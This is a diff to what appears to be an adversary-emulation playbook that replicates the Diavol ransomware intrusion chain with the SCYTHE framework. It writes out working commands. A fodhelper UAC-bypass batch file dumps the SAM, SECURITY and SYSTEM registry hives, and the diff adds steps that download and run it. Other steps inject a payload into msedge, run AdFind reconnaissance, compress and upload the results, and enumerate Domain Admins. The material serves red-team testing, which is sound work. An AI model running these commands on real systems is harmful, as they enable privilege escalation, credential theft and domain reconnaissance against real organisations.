@@ -77,24 +77,6 @@ This is a multi-stage attack leveraging multiple payloads and execution that per
 12. Inject DiavolStage1 insto msedge: ```scythe.phollowing --src VFS:/shared/Diavol/DiavolStage1.exe --target "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"```
 
 ### Diavol Stage 1
-Create fodhelper_reg_hashes.bat  and upload to VFS:/shared/Diavol/fodhelper_reg_hashes.bat
-
-```
-reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\sam c:\ProgramData\sam.save" /f
-reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
-fodhelper.exe
-
-reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\security c:\ProgramData\security.save" /f
-reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
-fodhelper.exe
-
-reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\system c:\ProgramData\system.save" /f
-reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
-fodhelper.exe
-
-reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
-```
-
 ```
 delay --time 900
 loader --load run
@@ -123,6 +105,23 @@ Create adf.bat and upload to VFS:/shared/Diavol/adf.bat
 %USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -f "(objectcategory=group)" > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_group.txt
 %USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -gcb -sc trustdmp > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_trustdmp2.txt
 ```
+Create fodhelper_reg_hashes.bat  and upload to VFS:/shared/Diavol/fodhelper_reg_hashes.bat
+
+```
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\sam c:\ProgramData\sam.save" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+fodhelper.exe
+
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\security c:\ProgramData\security.save" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+fodhelper.exe
+
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\system c:\ProgramData\system.save" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+fodhelper.exe
+
+reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
+```
 In the shell:
 ```
 loader --load run
@@ -137,6 +136,9 @@ downloader --src "https://www.joeware.net/downloads/files/AdFind.zip" --dest "%U
 run cmd /c powershell -Command Expand-Archive %USERPROFILE%\Desktop\Diavol\adfind\AdFind.zip -DestinationPath %USERPROFILE%\Desktop\Diavol\adfind\
 run cmd /c "start %USERPROFILE%\Desktop\Diavol\adfind\adf.bat"
 delay --time 600
+loader --load downloader
+downloader --src "VFS:/shared/Diavol/fodhelper_reg_hashes.bat" --dest "%USERPROFILE%\Desktop\Diavol\fodhelper_reg_hashes.bat"
+run cmd /c "start %USERPROFILE%\Desktop\Diavol\fodhelper_reg_hashes.bat"
 run powershell Compress-Archive "%USERPROFILE%\Desktop\Diavol\adfind\results\" "%USERPROFILE%\Desktop\Diavol\adfind\adf.zip
 loader --load uploader
 uploader --remotepath "%USERPROFILE%\Desktop\Diavol\adfind\adf.zip"
@@ -147,6 +149,8 @@ controller --shutdown
 ```
 
 ### Diavol Stage 3
+After 18 hours, the following was executed:
+
 ```
 loader --load run
 run net group "Domain Admins" /domain
